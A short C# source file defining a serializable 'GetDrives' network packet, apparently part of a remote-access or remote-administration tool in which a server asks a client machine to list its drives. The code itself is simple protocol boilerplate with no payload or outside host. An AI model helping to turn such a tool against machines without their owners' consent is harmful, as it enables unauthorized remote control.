using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetDrives : IPacket
    {
        public GetDrives()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}